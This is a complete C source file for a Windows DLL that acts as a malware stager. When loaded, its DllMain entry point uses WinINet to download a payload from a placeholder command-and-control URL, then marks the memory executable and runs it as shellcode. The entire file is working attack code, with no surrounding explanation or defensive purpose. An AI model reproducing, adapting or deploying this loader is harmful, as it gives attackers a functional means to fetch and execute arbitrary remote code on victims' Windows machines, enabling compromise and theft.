#include <windows.h>
#include <wininet.h>
// Link with wininet.lib

// Download payload directly into memory
LPVOID DownloadPayload(LPCSTR url, DWORD* outSize) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) { InternetCloseHandle(hInternet); return NULL; }

    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, 4096 * 1024, MEM_COMMIT, PAGE_READWRITE); // up to 4MB
    DWORD totalRead = 0, bytesRead = 0;
    while (InternetReadFile(hFile, buffer + totalRead, 4096, &bytesRead) && bytesRead)
        totalRead += bytesRead;

    InternetCloseHandle(hFile); InternetCloseHandle(hInternet);
    if (outSize) *outSize = totalRead;
    return buffer;
}

// Execute shellcode in memory
void ExecutePayload(LPVOID buffer, DWORD size) {
    DWORD oldProtect;
    VirtualProtect(buffer, size, PAGE_EXECUTE_READ, &oldProtect);
    ((void(*)())buffer)();
}

// DllMain Entry
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH: {
            DWORD payloadSize = 0;
            LPVOID payload = DownloadPayload("https://your-c2-server/payload.bin", &payloadSize);
            if (payload && payloadSize > 0) {
                ExecutePayload(payload, payloadSize);
                VirtualFree(payload, 0, MEM_RELEASE);
            }
            break;
        }
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
